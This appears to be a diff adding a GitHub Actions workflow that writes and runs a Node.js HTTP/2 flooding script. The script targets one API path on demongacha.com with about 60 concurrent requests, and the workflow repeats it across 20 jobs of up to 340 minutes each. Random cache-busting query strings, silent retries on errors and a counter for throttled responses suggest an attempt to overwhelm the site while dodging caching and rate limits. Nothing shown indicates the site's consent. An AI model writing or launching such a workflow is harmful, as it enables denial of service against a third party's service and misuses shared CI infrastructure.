@@ -1,0 +1,38 @@
+name: load
+on: workflow_dispatch
+jobs:
+  hit:
+    runs-on: ubuntu-latest
+    timeout-minutes: 340
+    strategy:
+      max-parallel: 1
+      fail-fast: false
+      matrix:
+        i: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    steps:
+      - uses: actions/setup-node@v4
+        with: { node-version: 20 }
+      - name: write harness
+        run: |
+          cat > hit.js <<'EOF'
+          const http2 = require('http2');
+          const SESSIONS = 4, C = 15;
+          let ok = 0, th = 0, err = 0;
+          const t0 = Date.now();
+          const pool = [];
+          for (let i = 0; i < SESSIONS; i++) { const s = http2.connect('https://demongacha.com'); s.on('error', () => {}); pool.push(s); }
+          function fire() {
+            const s = pool[Math.floor(Math.random() * pool.length)];
+            let r;
+            try { r = s.request({ ':path': '/api/clans/TANG?cb=' + Math.random().toString(36).slice(2) }); } catch (e) { err++; setTimeout(fire, 150); return; }
+            r.on('response', h => { if (h[':status'] !== 200) th++; });
+            r.on('data', () => {});
+            r.on('end', () => { ok++; fire(); });
+            r.on('error', () => { err++; setTimeout(fire, 150); });
+            r.end();
+          }
+          for (let i = 0; i < SESSIONS * C; i++) fire();
+          setInterval(() => { const t = (Date.now() - t0) / 1000; console.log(`ok=${ok} th=${th} err=${err} rps=${(ok / t).toFixed(0)}`); }, 5000);
+          EOF
+      - name: run
+        run: node hit.js
